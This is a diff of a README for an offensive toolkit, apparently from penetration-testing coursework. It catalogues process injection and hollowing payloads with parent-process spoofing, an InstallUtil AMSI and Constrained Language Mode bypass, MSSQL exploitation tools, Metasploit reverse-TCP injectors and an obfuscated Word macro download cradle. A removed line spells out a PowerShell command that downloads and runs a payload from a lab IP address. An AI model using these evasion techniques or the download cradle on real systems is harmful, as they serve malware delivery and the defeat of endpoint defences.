@@ -18,7 +18,7 @@ clinject - C# project source code for (IP + port + process) cli passed process i
 
 clhollow - C# project source code for (IP + port + PPID + process) cli passed process hollowing payload.
 
-bypass-clm - C# project source code for InstallUtil bypass for executing powershell commands via cli.  Contains AMSI patch
+bypass-clm - C# project source code for InstallUtil bypass for executing powershell commands interactively via cli.  Contains AMSI patch
 
 sql - C# project source code for SQL.exe project for exploitation of MSSQL servers in AD.
 
@@ -26,7 +26,7 @@ x64_met_staged_reversetcp_inject.exe - Command line args: IP PORT PROCESS_TO_INJ
 
 x64_met_staged_reversetcp_hollow.exe - Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer) 
 
-bypass-clm.exe - For use with InstallUtil. Contains AMSI binary patch. Pass powershell commands with /c= e.g. /c="iex (new-object net.webclient).downloadstring('http://192.168.49.68/payload.txt')"
+bypass-ps.exe - For use with InstallUtil. Contains AMSI binary patch. Will start an interactive powershell session in FullLanguageMode.
 
 sql.exe - x64 application for exploitation of linked SQL servers.  Has functionality for use with InstallUtil AppLocker bypass.
 
@@ -34,7 +34,6 @@ pscradle.docm - Word doc with caeser cipher encoding that calls powershell downl
 
 vbobfuscate.ps1 - ps1 to generate caeser cipher code for pscradle.  Make sure offsets match for encrypt/decrypt. First output is download cradle, last is app name for app name check before running. 
 
-clm-bypass.cs - C# code that can be comiled to bypass AMSI and run powershell commands.
 
 # NOTES
 
